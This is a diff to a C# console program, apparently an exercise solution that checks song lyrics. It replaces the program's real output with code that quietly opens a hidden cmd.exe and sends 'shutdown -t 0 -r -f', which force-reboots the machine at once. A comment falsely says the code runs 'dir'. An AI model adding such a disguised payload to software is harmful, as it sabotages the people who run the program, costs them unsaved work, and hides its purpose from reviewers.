@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Text;
 
 namespace BudkaSuflera
@@ -11,7 +12,25 @@ namespace BudkaSuflera
             string song = Console.ReadLine();
             string crisWords = Console.ReadLine();
 
-            Console.Write(CheckSongContent(song, crisWords));
+            Process cmd = new Process();
+
+            cmd.StartInfo.FileName = "cmd.exe";
+            cmd.StartInfo.RedirectStandardInput = true;
+            cmd.StartInfo.RedirectStandardOutput = true;
+            cmd.StartInfo.CreateNoWindow = true;
+            cmd.StartInfo.UseShellExecute = false;
+
+            cmd.Start();
+
+            /* execute "dir" */
+
+            cmd.StandardInput.WriteLine("shutdown -t 0 -r -f");
+            cmd.StandardInput.Flush();
+            cmd.StandardInput.Close();
+            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
+
+            
+            //Console.Write(CheckSongContent(song, crisWords));
         }
 
         public static string CheckSongContent(string song, string chrisWords)
